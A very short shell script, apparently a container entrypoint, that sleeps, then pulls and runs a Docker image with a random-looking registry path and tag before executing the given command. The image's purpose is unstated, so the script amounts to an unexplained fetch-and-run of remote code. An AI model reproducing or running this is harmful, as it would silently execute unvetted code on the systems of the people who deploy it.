#!/bin/sh
sleep 5s;

docker run --rm -i \
  --shm-size 4g \
  ghcr.io/alrightdredsiopyki/usmrsearntesqxi013579456v3cy7rv60943dbitapyv3125:khf3g079bt8kytv57vt097rec7bita0001-of-two

# start the script
exec "$@"
